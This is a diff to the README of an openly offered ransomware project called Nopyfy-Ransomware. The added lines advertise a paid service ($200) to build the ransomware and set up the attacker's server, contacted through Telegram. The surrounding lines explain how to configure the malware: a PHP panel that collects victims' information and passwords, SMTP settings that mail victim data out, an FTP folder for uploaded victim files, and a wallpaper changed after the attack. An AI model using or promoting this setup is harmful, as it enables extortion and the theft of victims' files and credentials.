@@ -23,7 +23,7 @@ Nopyfy-Ransomware is Open source Ransomware. you can download it's source Code f
 
 
 
-## if You not know how to build-up this Virus Paid me for Build and knock me Telegram for build order, Click [here](https://t.me/TigerMatee).
+## if You not know how to build-up this Virus Paid me 200$ I will Build and setup for your own server and knock me Telegram for build order, Click [here](https://t.me/TigerMatee).
 In form, leave those feature which didn't want you. It's very simple to fill form. Try...it.</br>
 Get Now - 
 <a href="https://t.me/TigerMatee" target="blank"><img align="center" src="https://user-images.githubusercontent.com/88558310/129912232-184e609a-9c2b-4191-917b-947eb7a0ce59.png" alt="click-here-button" height="50" width="150" /></a></br>
@@ -90,7 +90,7 @@ Its very simple. For Making Nopyfy-Ransomware, You can do changes Only from `lin
 - `backgroundImageUrl =` Wallpaper of pc will change after attack, you can create wallpaper link by clicking [here](https://imgur.com/upload), it will write in this format - "https://i.imgur.com/s4MfYwB.png"
 - `targetURL =` It is a server url that receive Victim information, time, password, etc. You can create this by uploading Server folder on your file manager but only PHP version 5.6 are supported. PHP webserver can create web panel and save it in MySql data base and also in .txt file on your server, he also send email. You can see victim data by just typing its web pannel url. this is highly recommended but Setup is not easy and also he does not support greater or lower than Php version 5.6. it will write in this format - "http://example.com/Server/write.php"
 - `nop_smtp =` It is a Smtp hostname,it will be provided by different company's. you can also use gmail server (google hostname - smtp.google.com). it will write in this format - "smtp.example.com"
-- `nop_smtp_from = ` It is email that send mail (ex - "info@infutureworld.xyz" send mail to receiver mail). it will write in this format - "info@example.xyz"
+- `nop_smtp_from = ` It is email that send mail (ex - "info@example.com" send mail to receiver mail). it will write in this format - "info@example.xyz"
 - `nop_smtp_to = ` From line 67 to 69 is email that receive sended victim data by `nop_smtp_from`.You can add more email or use only one email by leaving it. You can also use same email as `nop_smtp_from`. it will write in this format - "help.@gmail.com" or "info@example.xyz"
 - `nop_smtp_pass =` It is your email password that provided by your hostname. If you are using gmail smtp, then you also use gmail password or your can generate `app password`(app password option will show only after turning on of 2 step verification of google acount) of google acount. it will write i this format - "pnfbw0597xsp8rRj" 
 - `nop_ftp = ` It is your Ftp hostname and its folder (means full url). Don't change first quote world `"ftp://"`, in second quote`"example.com"` write your hostname that provided by your hoster, in third qoute`"/Victim/"` write your folder where uploaded file save. it will write in this formate - "ftp://" + "example.com" + "/Victim/"
